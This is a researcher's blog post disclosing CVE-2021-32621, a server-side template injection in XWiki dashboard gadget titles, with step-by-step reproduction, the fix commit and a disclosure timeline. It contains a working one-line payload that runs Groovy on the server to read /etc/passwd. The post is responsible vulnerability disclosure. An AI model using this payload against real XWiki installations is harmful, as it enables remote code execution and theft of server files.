---
layout: post
title:  "XWiki Platform RCE via gadget titles in the dashboard (CVE-2021-32621)"
date:   2021-06-17 19:07:56 +0300
categories: cve
---

It all started with [Users with SCRIPT right can access the application server instance manager and create arbitrary Java objects through $request binding](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-7qw5-pqhc-xm4g). I tried other fields where similar payload for Server-Side Template Injection could work and found one more.

## Short description:

Registered users are able to execute server side code via gadget title (Server-Side Template Injection).

## Links:

- [Script injection without script or programming rights through Gadget titles](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-h353-hc43-95vc)
- [XWIKI-17794](https://jira.xwiki.org/browse/XWIKI-17794)
- [CVE-2021-32621](https://nvd.nist.gov/vuln/detail/CVE-2021-32621)

## Details:

Full path to reproduce:

1. Open XWiki platform (I used http://playground.xwiki.org/ and local installation using docker image)
2. Go to profile -> Edit -> My dashboard -> Add gadget
3. Choose any gadget (e.g. content or python).
4. Paste following payload into title (one line): ```$request.getServletContext().getAttribute("org.apache.tomcat.InstanceManager")
.newInstance("javax.script.ScriptEngineManager").getEngineByName("groovy").eval("new File('/etc/passwd').text")```
5. Submit the gadget

[![rce_gadget_title_playground_xwiki_org](/images/rce_gadget_title_playground_xwiki_org.png)](/images/rce_gadget_title_playground_xwiki_org.png)

Fix in source code: [XWIKI-17794: Properly interpret velocity in gadget titles](https://github.com/xwiki/xwiki-platform/commit/bb7068bd911f91e5511f3cfb03276c7ac81100bc). So now evaluation of title is wrapped with check for user right 'SCRIPT'.


## Timeline:

1. 14 Sep 2020 - reported to XWiki team
2. 12 Jan 2021 - confirmed and fixed
3. 18 May 2021 - published
4. 28 May 2021 - CVE assigned

## Acknowledgement

Thanks to [d4d](https://twitter.com/d4d89704243) for helping with working payload.